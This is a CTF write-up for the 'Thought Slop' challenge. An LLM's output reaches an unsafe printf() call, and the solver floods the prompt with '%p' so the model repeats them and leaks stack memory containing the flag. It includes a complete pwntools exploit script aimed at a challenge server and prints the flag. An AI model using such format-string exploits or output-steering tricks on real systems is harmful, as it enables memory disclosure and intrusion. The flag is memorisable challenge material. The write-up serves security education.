---
title: "RSTCON 2026 CTF: Thought Slop Writeup"
---

## Overview
"With all this AI Slop, I might actually have to Use my brain and start Thought Slopping to solve this challenge."

```
Dockerfile  flag.txt  Makefile  run.sh  thoughtful.c
```

```bash
chmod +x run.sh
sudo docker build -t thoughtful .
sudo docker run --rm -p 8888:8888 thoughtful
```

---
## Vulnerability
`printf()` is called insecurely, which results in a format string vulnerability. However, it cannot be triggered by the user because our input is never passed. Only the LLM output can pass an input into the insecure `printf()`.

![Vulnerable Code Photo](/assets/images/rstcon2026/thoughtslop_vuln.png)

The model used in this challenge is simply put, a token predictor. It guesses the next token in the text so far. So what would happen if we put a bunch of `%p`'s repeatedly?

---
## Exploit Development
Because we are basically brainwashing the LLM, it will take multiple prompts of the same `%p` before it learns from it and starts outputting that itself. Each run it samples new tokens, and if all we are doing is sending `%p`, it has nothing else to work with.

![Leak Photo](/assets/images/rstcon2026/thoughtslop_fmtstr.png)

Before I didn't include enough `%p`'s and the flag got cut off short, so what I did is include a few more `%p`'s to leak more of the stack to cover the whole flag.

---
## Final Pwn

```python
import re
from pwn import *

LOCAL_HOST, LOCAL_PORT = "127.0.0.1", 8888
HOST, PORT = "18.215.143.250", 8888
context.log_level = "info"

def start():
    if args.LOCAL:
        return remote(LOCAL_HOST, LOCAL_PORT)
    return remote(HOST, PORT)


HEX = re.compile(rb"0x[0-9a-fA-F]+")
PAYLOAD = b"%p " * 21

# Optional flag finding and decoding, can be done outside of script
def find_flag(buf):
    raw = b"".join(p64(int(t, 16) & 0xFFFFFFFFFFFFFFFF) for t in HEX.findall(buf))
    s = raw.find(b"rstcon{")
    if s == -1:
        return None
    e = raw.find(b"}", s)
    if e == -1:
        return None
    return raw[s:e + 1]


io = start()
io.recvuntil(b"> ")
buf = b""

# Prompt 10 times and search for flag each time
for i in range(10):
    io.sendline(PAYLOAD)
    try:
        buf += io.recvuntil(b"> ", timeout=120)
    except EOFError:
        break

    flag = find_flag(buf)
    if flag:
        print(flag.decode())
        break

```
```
rstcon{nuclear_0pti0n_trash_EVERYTHING}
```